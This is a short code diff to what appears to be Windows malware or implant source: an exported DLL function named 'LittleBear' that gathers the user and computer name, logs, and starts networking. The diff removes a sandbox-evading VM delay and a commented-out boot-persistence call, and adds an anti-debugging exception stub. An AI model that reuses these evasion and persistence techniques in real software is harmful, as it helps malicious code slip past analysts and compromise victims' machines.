@@ -46,11 +46,7 @@ using namespace std;
 //http://icanhazip.com/
 //http://ip-api.com/line/
 
-#ifdef _DEBUG
-#define VM_EVASION_DELAY	3
-#else
-#define VM_EVASION_DELAY	180
-#endif
+
 
 
 extern "C" __declspec(dllexport) int __stdcall LittleBear()
@@ -89,7 +85,13 @@ extern "C" __declspec(dllexport) int __stdcall LittleBear()
 
 	iRet = furtherApi();
 
-	iRet = delay(VM_EVASION_DELAY);
+	__try {
+		//__asm {int 3}
+	}
+	__except(EXCEPTION_CONTINUE_EXECUTION) {
+
+	}
+
 
 	//need to get computer info before write log file
 	iRet = GetUserAndComputerName(strUserName, strComputerName);
@@ -102,8 +104,6 @@ extern "C" __declspec(dllexport) int __stdcall LittleBear()
 		writeLog("createDataPath error\r\n");
 		return FALSE;
 	}
-
-	//iRet = setBoot(szSysDir, strPEResidence, iSystemVersion);
 
 	iRet = networkInit();
 
